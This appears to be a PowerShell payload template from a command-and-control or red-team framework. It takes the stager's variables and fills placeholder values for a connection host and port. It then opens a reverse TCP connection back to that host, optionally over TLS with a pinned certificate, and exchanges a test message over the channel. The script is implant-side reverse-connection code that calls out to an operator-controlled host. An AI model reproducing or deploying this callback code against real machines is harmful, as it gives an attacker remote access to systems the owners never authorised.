
# Recycle stager variables
if ($fp) {
    $servercertfp = $fp
} else {
    $servercertfp = $null
}

$CONNECTIONMETHOD = "SYREPLACE_CONNECTIONMETHOD"
$CHANNELENCRYPTION = "SYREPLACE_CHANNELENCRYPTION"
$CONNECTHOST = "SYREPLACE_CONNECTHOST"
$CONNECTPORT = "SYREPLACE_CONNECTPORT"

if ($CONNECTIONMETHOD -eq "REVERSETCP") {
    $tcp = Transport-ReverseTcp-Open -LHost $CONNECTHOST -LPort $CONNECTPORT
    if ($CHANNELENCRYPTION -eq "NONE") {
        Write-Output "Warning: CONNECTION UNENCRYPTED"
        $transport = $tcp
    } elseif ($CHANNELENCRYPTION -eq "TLS") {
        $transport = Transport-Tls-Open $tcp.tcpStream $servercertfp
    } else {
        Write-Output "ERROR: wrapper method not defined"
    }

    $res = Message-ParseFromTransport $transport
    $res.content -join '' | Write-Output
    $message1 = Message-Create -MType 4 -Content "Test"
    Message-SendToTransport $message1 $transport
    $res = Message-ParseFromTransport $transport
    $res.content -join '' | Write-Output

    if ($CHANNELENCRYPTION -eq "TLS") {
        Transport-Tls-Close $transport
    }

    Transport-ReverseTcp-Close $tcp
} else {
    Write-Output "ERROR: connection method not defined"
}

